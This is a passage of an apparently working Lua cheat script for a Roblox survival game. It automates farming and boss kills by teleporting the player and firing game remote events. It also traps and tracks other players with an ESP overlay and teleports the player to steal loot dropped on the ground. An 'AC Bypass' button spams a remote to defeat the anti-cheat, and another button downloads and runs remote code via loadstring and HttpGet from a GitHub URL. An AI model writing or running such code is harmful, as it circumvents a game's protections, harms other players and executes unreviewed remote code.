						LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(enemyroot + Vector3.new(0, 25, 0))
					end
				end
			end
        end
    end
end

function ConiferFarm()
    local function GetClosestTree()
        local range = math.huge
        local closestree
        for _, tree in pairs(Workspace:WaitForChild('Replicators'):WaitForChild('Both'):GetChildren()) do
            if tree.Name == 'Conifer' then
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - tree:GetPivot().Position).magnitude
                if dist < range then
                    range = dist
                    closestree = tree
                end
            end
        end
        return closestree
    end

    local function TreeFarm()
        local ClosestTree
        ClosestTree = GetClosestTree()
        if ClosestTree then
            repeat task.wait()
                ClosestTree = GetClosestTree()
                if not getgenv().configs.ConfierFarm then 
                    if IsPlayerAlive(LocalPlayer) then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
                    end
                    return
                end
                if ClosestTree.Parent then
                    if IsPlayerAlive(LocalPlayer) then
                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(ClosestTree:GetPivot().Position)
                        RemoteEvents['ToolAction']:FireServer(ClosestTree)
                    end
                end
            until not ClosestTree.Parent or not IsPlayerAlive(LocalPlayer) or not getgenv().configs.ConfierFarm
        end
    end
    while getgenv().configs.ConfierFarm and task.wait() do
        if not getgenv().configs.ConfierFarm then 
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X+10, LocalPlayer.Character.HumanoidRootPart.CFrame.Y, LocalPlayer.Character.HumanoidRootPart.CFrame.Z-10)
            end
        end
        if IsPlayerAlive(LocalPlayer) then
            if not Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Conifer') then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(LocalPlayer.Character.HumanoidRootPart.CFrame.X, 400, LocalPlayer.Character.HumanoidRootPart.CFrame.Z)
            else
                TreeFarm()
            end
        end
    end
end

function AutoRepairClub()
    if getgenv().configs.AutoRepairClub then
        local zenwastrue = false
        local spiritwastrue = false
        local obwastrue = false
        for _, tool in pairs(MyInventory:GetChildren()) do
            if tool.Name == 'Obsidian Club' then
                if not getgenv().PercentChanged then
                    getgenv().PercentChanged = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label'):GetPropertyChangedSignal("Text"):Connect(function()
                        if not getgenv().configs.AutoRepairClub then
                            getgenv().PercentChanged:Disconnect()
                            getgenv().PercentChange = nil
                            return
                        end
                        local percentdegraded = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(1, 4)
                        local checkdecimal = tool:FindFirstChild('Top'):FindFirstChild('Right'):FindFirstChild('Degradable'):FindFirstChild('Label').Text:sub(3, 3)
                        if checkdecimal == '.' then
                            if tonumber(percentdegraded) <= 50.5 then
                                local ClosestChest = GetClosestChest()
                                if ClosestChest then
                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                    RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
                                    MakeAtlasNotification('Repaired', 'Club repaired', 1)
                                    task.wait(0.2)
                                    pcall(function()
                                        if MyInventory:FindFirstChild('Obsidian Club') then
                                            if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
                                                RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
                                            end
                                        end
                                    end)
                                else
                                    if getgenv().configs.ZenLuckBoss then
                                        zenwastrue = true
                                        getgenv().configs.ZenLuckBoss = false
                                    elseif getgenv().configs.SpiritBoss then
                                        spiritwastrue = true
                                        getgenv().configs.SpiritBoss = false
                                    elseif getgenv().configs.ObsidianBoss then
                                        obwastrue = true
                                        getgenv().configs.ObsidianBoss = false
                                    end
                                    if IsPlayerAlive(LocalPlayer) then
                                        task.wait(0.2)
                                        local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
                                        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(7296, 274, 18681))
                                        task.wait(0.5)
                                        RemoteEvents['CraftItem']:FireServer(11, Vector3.new(7303.52, 288, 18678.74), 0)
                                        task.wait(0.5)
                                        local ClosestChest = GetClosestChest()
                                        if ClosestChest then
                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, 230)
                                            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, 230)
                                            MakeAtlasNotification('Repaired', 'Club repaired', 1)

                                            task.wait(0.2)
                                            pcall(function()
                                                if MyInventory:FindFirstChild('Obsidian Club') then
                                                    if MyInventory:FindFirstChild('Obsidian Club'):FindFirstChild('Bottom'):FindFirstChild('Equip'):FindFirstChild('TextLabel').Text == "Equip" then
                                                        RemoteEvents['InventoryInteraction']:FireServer(230, "Equip")
                                                    end
                                                end
                                            end)
                                            if zenwastrue then
                                                zenwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.ZenLuckBoss = true
                                                    ZenLuckBoss()
                                                end)
                                            elseif spiritwastrue then
                                                spiritwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.SpiritBoss = true
                                                    SpiritBoss()
                                                end)
                                            elseif obwastrue then
                                                obwastrue = false
                                                task.spawn(function()
                                                    getgenv().configs.ObsidianBoss = true
                                                    ObsidianBoss()
                                                end)
                                            else
                                                LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end)
                end
            end
        end
    else
        if getgenv().PercentChanged then
            getgenv().PercentChanged:Disconnect()
            getgenv().PercentChanged = nil
        end
    end
end

function TrapPlayer()
    if IsPlayerAlive(LocalPlayer) then
        local function GetClosestTrapPlayer()
            local range = 70
            local closest = nil
            for _, plr in pairs(Players:GetPlayers()) do
                if plr ~= LocalPlayer and IsPlayerAlive(plr) and IsPlayerAlive(LocalPlayer) then
                    local dist = (LocalPlayer.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).magnitude
                    if plr.Character.Humanoid.MoveDirection.Magnitude > 0 then
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position + plr.Character.HumanoidRootPart.AssemblyLinearVelocity) + Vector3.new(0, 1, 0)
                        end
                    else
                        if dist < range then
                            range = dist
                            closest = (plr.Character.LeftFoot.Position) + Vector3.new(0, 1, 0)
                        end
                    end
                end
            end
            return closest
        end
        RemoteEvents['CraftItem']:FireServer(SWITCHEDITEMSTABLE[getgenv().configs.TrapType], GetClosestTrapPlayer(), 690)
    end
end

function ObsidianBoss()
    while getgenv().configs.ObsidianBoss do
        if getgenv().configs.ObsidianBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
            local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem')
                if not getgenv().configs.ZenLuckBoss and not getgenv().configs.SpiritBoss then
                    if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                        if not AutoPickupOnObsidianDeath then
                            AutoPickupOnObsidianDeath = Boss.AncestryChanged:Connect(function(golem, parent)
                                if not getgenv().configs.ObsidianBoss then
                                    AutoPickupOnObsidianDeath:Disconnect()
                                    AutoPickupOnObsidianDeath = nil
                                end
                                if not parent then
                                    task.wait(0.2)
                                    AutoPickup()
                                    if AutoPickupOnObsidianDeath then
                                        AutoPickupOnObsidianDeath:Disconnect()
                                        AutoPickupOnObsidianDeath = nil
                                    end
                                end
                            end)
                        end
                        local bosspos = Boss.HumanoidRootPart.Position
                        local myroot = LocalPlayer.Character.HumanoidRootPart
                        if Boss.Humanoid.Health > 50 then
                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                        else
                            myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                        end
                        RemoteEvents['ToolAction']:FireServer(Boss)
                    end
                end
            end
        end
    end
end

function ZenLuckBoss()
    local function AttackBoss()
        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
            if not AutoPickupOnZenLuckBossDeath then
                AutoPickupOnZenLuckBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                    if not getgenv().configs.ZenLuckBoss then
                        AutoPickupOnZenLuckBossDeath:Disconnect()
                        AutoPickupOnZenLuckBossDeath = nil
                    end
                    if not parent then
                        task.wait(0.2)
                        AutoPickup()
                        if AutoPickupOnZenLuckBossDeath then
                            AutoPickupOnZenLuckBossDeath:Disconnect()
                            AutoPickupOnZenLuckBossDeath = nil
                        end
                    end
                end)
            end
            local bosspos = Boss.HumanoidRootPart.Position
            local myroot = LocalPlayer.Character.HumanoidRootPart
            if Boss.Humanoid.Health > 50 then
                myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13, 0))
            else
                myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 10, 0))
            end
            RemoteEvents['ToolAction']:FireServer(Boss)
        else
            if not AutoPickupOnZenLuckBossDeath then
                task.wait(1)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):WaitForChild("Cave Door (z)"))
            end
        end
    end
    while getgenv().configs.ZenLuckBoss do
        if getgenv().configs.ZenLuckBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Soul = MyInventory:FindFirstChild('Soul')
                if Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters") then
                    Workspace:WaitForChild('Map'):WaitForChild("Zenyte Boss Cave"):FindFirstChild("Gem Clusters"):Destroy()
                end
                if getgenv().configs.ObsidianBoss then
                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
                        AttackBoss()
                    end
                else
                    AttackBoss()
                end
                if getgenv().configs.UseSoulKeys then
                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
                            RemoteEvents['CraftItem']:FireServer(220)
                        end
                    end
                end
            end
        end
    end
end

function SpiritBoss()
    local function AttackBoss()
        local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Zenyte Golem') or Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Lucky Golem')
        if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
            if not AutoPickupOnSpiritBossDeath then
                AutoPickupOnSpiritBossDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                    if not getgenv().configs.SpiritBoss then
                        AutoPickupOnSpiritBossDeath:Disconnect()
                        AutoPickupOnSpiritBossDeath = nil
                    end
                    if not parent then
                        task.wait(0.2)
                        AutoPickup()
                        if AutoPickupOnSpiritBossDeath then
                            AutoPickupOnSpiritBossDeath:Disconnect()
                            AutoPickupOnSpiritBossDeath = nil
                        end
                    end
                end)
            end
            local bosspos = Boss.HumanoidRootPart.Position
            local myroot = LocalPlayer.Character.HumanoidRootPart
            if Boss.Humanoid.Health >= 50 then
                TweenService:Create(myroot, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(-13, 18, 0))}):Play()
            else
                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(0, 22, 0))}):Play()
            end
            if not getgenv().configs.SpiritBoss == false then
                TweenService:Create(myroot, TweenInfo.new(0.1, Enum.EasingStyle.Linear), {CFrame = CFrame.new(bosspos + Vector3.new(25, 18, 0))}):Play()
            end
            RemoteEvents['ToolAction']:FireServer(Boss)
        else
            if not AutoPickupOnSpiritBossDeath then
                task.wait(1)
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1663, -460, -4558)
                RemoteEvents['KeyDoor']:FireServer(Workspace:WaitForChild('Map'):WaitForChild("Mushroom Boss Cave "):WaitForChild("Cave Door (d)"))
            end
        end
    end
    while getgenv().configs.ZenLuckBoss do
        if getgenv().configs.ZenLuckBoss then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Soul = MyInventory:FindFirstChild('Soul')
                if Workspace:FindFirstChild('PoisionMushroom') then
                    Workspace:FindFirstChild('PoisionMushroom'):Destroy()
                end
                if getgenv().configs.ObsidianBoss then
                    if not Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Obsidian Golem') then
                        AttackBoss()
                    end
                else
                    AttackBoss()
                end
                if getgenv().configs.UseSoulKeys then
                    if Soul and Soul:FindFirstChild('Top'):FindFirstChild('TextLabel') then
                        local SoulAmount = string.match(Soul.Top.TextLabel.Text, '%d+')
                        if tonumber(SoulAmount) >= 10 and not MyInventory:FindFirstChild('Soul Key') then
                            RemoteEvents['CraftItem']:FireServer(220)
                        end
                    end
                end
            end
        end
    end
end

function LuckySlime()
    while getgenv().configs.LuckySlime do
        if getgenv().configs.LuckySlime then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):WaitForChild('Both'):FindFirstChild('Lucky Slime')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickuponLuckySlimeDeath then
                        AutoPickuponLuckySlimeDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.LuckySlime then
                                AutoPickuponLuckySlimeDeath:Disconnect()
                                AutoPickuponLuckySlimeDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickuponLuckySlimeDeath then
                                    AutoPickuponLuckySlimeDeath:Disconnect()
                                    AutoPickuponLuckySlimeDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function EvilSkeleton()
    while getgenv().configs.EvilSkeleton do
        if getgenv().configs.EvilSkeleton then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Evil Skeleton')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnSkeletonDeath then
                        AutoPickupOnSkeletonDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.EvilSkeleton then
                                AutoPickupOnSkeletonDeath:Disconnect()
                                AutoPickupOnSkeletonDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnSkeletonDeath then
                                    AutoPickupOnSkeletonDeath:Disconnect()
                                    AutoPickupOnSkeletonDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    if not getgenv().configs.EvilSkeleton then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function Ogre()
    while getgenv().configs.Ogre do
        if getgenv().configs.Ogre then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Ogre')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnOgreDeath then
                        AutoPickupOnOgreDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.Ogre then
                                AutoPickupOnOgreDeath:Disconnect()
                                AutoPickupOnOgreDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnOgreDeath then
                                    AutoPickupOnOgreDeath:Disconnect()
                                    AutoPickupOnOgreDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(-8, 13.5, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 15, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function Squid()
    while getgenv().configs.Squid do
        if getgenv().configs.Squid then
            task.wait()
            if getgenv().configs.KillAura == true then
                getgenv().configs.KillAura = false
            end
            if IsPlayerAlive(LocalPlayer) then
                local Boss = Workspace:WaitForChild('Replicators'):FindFirstChild('NonPassive'):FindFirstChild('Captain Squid')
                if Boss and Boss:FindFirstChild('HumanoidRootPart') and Boss:FindFirstChild('Humanoid') and Boss:FindFirstChild('Humanoid').Health > 0 then
                    if not AutoPickupOnSquidDeath then
                        AutoPickupOnSquidDeath = Boss.AncestryChanged:Connect(function(slime, parent)
                            if not getgenv().configs.Squid then
                                AutoPickupOnSquidDeath:Disconnect()
                                AutoPickupOnSquidDeath = nil
                            end
                            if not parent then
                                task.wait(0.2)
                                AutoPickup()
                                if AutoPickupOnSquidDeath then
                                    AutoPickupOnSquidDeath:Disconnect()
                                    AutoPickupOnSquidDeath = nil
                                end
                            end
                        end)
                    end
                    local bosspos = Boss.HumanoidRootPart.Position
                    local myroot = LocalPlayer.Character.HumanoidRootPart
                    if Boss.Humanoid.Health > 50 then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, -15, 0))
                    else
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    if not getgenv().configs.Squid then
                        myroot.CFrame = CFrame.new(bosspos + Vector3.new(0, 17.5, 0))
                    end
                    RemoteEvents['ToolAction']:FireServer(Boss)
                end
            end
        end
    end
end

function InfJump()
    getgenv().InfiniteJump = Mouse.KeyDown:Connect(function(Key)
        if Key == " " then
            if getgenv().configs.InfJump and IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):ChangeState(3)
            else
                getgenv().InfiniteJump:Disconnect()
            end
        end
    end)
end

function JumpPower()
    while getgenv().configs.JumpPower do
        if getgenv().configs.JumpPower then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.JumpPower = 100
            end
        end
    end
end

function SpringyPower()
    while getgenv().configs.SpringyPower do
        if getgenv().configs.SpringyPower then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.JumpPower = 60
            end
        end
    end
end

function SpringyEasterPower()
    while getgenv().configs.SpringyEasterPower do
        if getgenv().configs.SpringyEasterPower then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.JumpPower = 75
            end
        end
    end
end

function ExtraSpeed()
    while getgenv().configs.ExtraSpeed do
        if getgenv().configs.ExtraSpeed then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.WalkSpeed = 21
            end
        end
    end
end

function CandySpeed()
    while getgenv().configs.CandySpeed do
        if getgenv().configs.CandySpeed then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.WalkSpeed = 23
            end
        end
    end
end

function FasterSpeed()
    while getgenv().configs.FasterSpeed do
        if getgenv().configs.FasterSpeed then
            task.wait()
            if IsPlayerAlive(LocalPlayer) then
                LocalPlayer.Character.Humanoid.WalkSpeed = 25
            end
        end
    end
end

local ChrAddedFunc
function PlayerEsp()
    if getgenv().configs.PlayerEsp then
        function EspOnPlayer(target)
            local EspRenderStepped
            local Boxoutline = Drawing.new('Square')
            Boxoutline.Thickness = 1
            Boxoutline.Filled = false
            Boxoutline.Transparency = 1
            Boxoutline.Color = Color3.new(0, 0, 0)
            
            local Box = Drawing.new('Square')
            Box.Thickness = 1
            Box.Transparency = 1
            Box.Filled = false
            Box.Color = Color3.fromRGB(0, 255, 0)
            
            local Healthbaroutline = Drawing.new('Square')
            Healthbaroutline.Thickness = 1
            Healthbaroutline.Filled = false
            Healthbaroutline.Transparency = 1
            Healthbaroutline.Color = Color3.new(0, 0, 0)
            
            local Healthbar = Drawing.new('Square')
            Healthbar.Thickness = 1
            Healthbar.Filled = false
            Healthbar.Transparency = 1
            Healthbar.Color = Color3.fromRGB(0, 255, 0)
            EspRenderStepped = RunService.RenderStepped:Connect(function()
                if getgenv().configs.PlayerEsp == false then
                    if Boxoutline then
                        Boxoutline:Remove()
                    end
                    if Box then
                        Box:Remove()
                    end
                    if Healthbaroutline then
                        Healthbaroutline:Remove()
                    end
                    if Healthbar then
                        Healthbar:Remove()
                    end
                    if EspRenderStepped then
                        EspRenderStepped:Disconnect()
                    end
                return end
                if target then
                    if IsPlayerAlive(target) then
                        local HumPos, onScreen = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position)
                        if onScreen then
                            local headpos = Camera:WorldToViewportPoint(target.Character.Head.Position + Vector3.new(0, 0.5, 0))
                            local LegPosition = Camera:WorldToViewportPoint(target.Character.HumanoidRootPart.Position - Vector3.new(0, 4.5, 0))
                            
                            Boxoutline.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
                            Boxoutline.Position = Vector2.new(HumPos.X - Boxoutline.Size.X / 2, HumPos.Y - Boxoutline.Size.Y / 2)
                            Boxoutline.Visible = true
                            
                            Box.Size = Vector2.new(1050 / HumPos.Z, headpos.Y - LegPosition.Y)
                            Box.Position = Vector2.new(HumPos.X - Box.Size.X / 2, HumPos.Y - Box.Size.Y / 2 )
                            Box.Visible = true
                            
                            Healthbaroutline.Size = Vector2.new(2, headpos.Y - LegPosition.Y)
                            Healthbaroutline.Position = Boxoutline.Position - Vector2.new(8, 0)
                            Healthbaroutline.Visible = true
                            
                            Healthbar.Size = Vector2.new(2, (headpos.Y - LegPosition.Y) / (target.Character:FindFirstChildOfClass('Humanoid').MaxHealth / math.clamp(target.Character:FindFirstChildOfClass('Humanoid').Health, 0, target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)))
                            Healthbar.Position = Vector2.new(Box.Position.X - 8, Box.Position.Y + (1/Healthbar.Size.Y))
                            Healthbar.Color = Color3.fromRGB(255, 0, 0):lerp(Color3.fromRGB(0, 255, 0), target.Character:FindFirstChildOfClass('Humanoid').Health / target.Character:FindFirstChildOfClass('Humanoid').MaxHealth)
                            Healthbar.Visible = true
                        else
                            Boxoutline.Visible = false
                            Box.Visible = false
                            Healthbaroutline.Visible = false
                            Healthbar.Visible = false
                        end
                    else
                        Boxoutline.Visible = false
                        Box.Visible = false
                        Healthbaroutline.Visible = false
                        Healthbar.Visible = false
                    end
                end
            end)
        end
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                EspOnPlayer(plr)
            end
        end
        if not ChrAddedFunc then
            ChrAddedFunc = Players.PlayerAdded:Connect(function(plr)
                if not getgenv().configs.PlayerEsp then
                    ChrAddedFunc:Disconnect()
                    ChrAddedFunc = nil
                end
                EspOnPlayer(plr)
            end)
        end
    end
end

--Sections and ui stuff
MainTab:AddButton({
    Name = 'AC Bypass',
    Callback = function()
        if not IsPlayerAlive(LocalPlayer) then
            MakeAtlasNotification('Not alive', 'Maybe click the play button?', 5)
            return
        end
        if IsPlayerAlive(LocalPlayer) then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            local myroot = LocalPlayer.Character.HumanoidRootPart
			for i=1, 100 do
				myroot.CFrame = CFrame.new(7562, 221, 18946)
            	RemoteEvents['Sonar']:FireServer()
            	myroot.CFrame = oldpos
			end
            message.New('Positive', 'Bypassed AntiCheat')
        end
    end
})

MainTab:AddButton({
    Name = 'Infinite Yield',
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source', true))()
    end
})

MainTab:AddBind({
    Name = 'AutoPickup',
	Default = Enum.KeyCode.X,
	Hold = false,
})

MainTab:AddToggle({
    Name = 'AutoPickup(toggle)',
	Default = false,
    Callback = function(Value)
        getgenv().configs.AutoPickup2 = Value
        AutoPickup2() 
    end
})

MainTab:AddButton({
    Name = 'Steal any op loot on ground',
    Callback = function(Value)
        local function FindFunnyClosestItem()
            local closest
            local range = math.huge
            for _, funnyitem in pairs(Workspace:GetDescendants()) do
				if funnyitem:IsA("Model") then
					if string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'staff') or string.find(funnyitem.Name:lower(), 'moonstone') or string.find(funnyitem.Name:lower(), 'lunar') or string.find(funnyitem.Name:lower(), 'zenyte') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'diamond') or string.find(funnyitem.Name:lower(), 'obsidian') or string.find(funnyitem.Name:lower(), 'lucky') or string.find(funnyitem.Name:lower(), 'pumpkin') or string.find(funnyitem.Name:lower(), 'book') or string.find(funnyitem.Name:lower(), 'volcanic ore') then
						if not funnyitem:FindFirstChildOfClass('StringValue') and not funnyitem.Parent:FindFirstChildOfClass('Humanoid') and not string.find(funnyitem.Name:lower(), 'harvest') and not string.find(funnyitem.Name:lower(), 'wizard') and not string.find(funnyitem.Name:lower(), 'zenytes') and not string.find(funnyitem.Parent.Name:lower(), 'anvil') and not string.find(funnyitem.Name:lower(), 'pet') and not string.find(funnyitem.Name:lower(), 'cave') and not string.find(funnyitem.Name:lower(), 'rock') and not string.find(funnyitem.Name:lower(), 'stone') then
							if IsPlayerAlive(LocalPlayer) then
								local dist = (LocalPlayer.Character.HumanoidRootPart.Position - funnyitem:GetPivot().Position).magnitude
								if dist < range then
									range = dist
									closest = funnyitem
								end
							end
						end
					end
				end
            end
            return closest
        end
        if FindFunnyClosestItem() then
            local oldpos = LocalPlayer.Character.HumanoidRootPart.CFrame
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(FindFunnyClosestItem():GetPivot().Position)
            task.wait(0.2)
            AutoPickup()
            LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
        else
            MakeAtlasNotification('wah wah wahhh', 'noting good on da floor :(', 3)
        end
    end
})

MainTab:AddDropdown({
    Name = "Instant Repair",
    Default = "...",
    Options = {'MoonstoneSet', 'ObsidianSet', 'AllShields', 'AllSwords', 'AllBows', 'AllBooks', 'AllStaffs'},
    Callback = function(Value)
        local ClosestChest = GetClosestChest()
        if not ClosestChest then
            MakeAtlasNotification('Needs chest', 'Place any chest down!', 2.5)
            return
        end
        local set

        if Value == 'MoonstoneSet' then
            set = MoonstoneSet
        elseif Value == 'ObsidianSet' then
            set = ObsidianSet
        elseif Value == 'AllShields' then
            set = AllShields
        elseif Value == 'AllSwords' then
            set = AllSwords
        elseif Value == 'AllBows' then
            set = AllBows
        elseif Value == 'AllBooks' then
            set = AllBooks
        elseif Value == 'AllStaffs' then
            set = AllStaffs
        end

        for _, piece in pairs(set) do
            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, true, piece)
            RemoteEvents['UpdateStorageChest']:FireServer(ClosestChest, false, piece)
        end
        MakeAtlasNotification('Repaired', 'Repaired '..Value, 1)
    end
})


MainTab:AddDropdown({
    Name = 'Specific Chest Type',
    DefaultItemSelected = 'Any',
    Options = {'Any', 'Wood', 'Stone', 'Silver', 'Gold', 'Ruby', 'Diamond', 'Zenyte', 'Obsidian', 'Moonstone'},
    ItemSelecting = true,
    Callback = function(Value)
        getgenv().configs.ChestType = Value 
    end
})

MainTab:AddButton({
    Name = 'Store Item',
    Callback = function()
        local function GetClosestFilteredChest()
            local CheckPassiveOrNonPassive = Workspace:FindFirstChild("Replicators"):FindFirstChild('NonPassive') and 'NonPassive' or 'Passive'
	        local closest
	        local range = math.huge
            if IsPlayerAlive(LocalPlayer) then
                for _, chest in pairs(Workspace:WaitForChild("Replicators")[CheckPassiveOrNonPassive]:GetChildren()) do
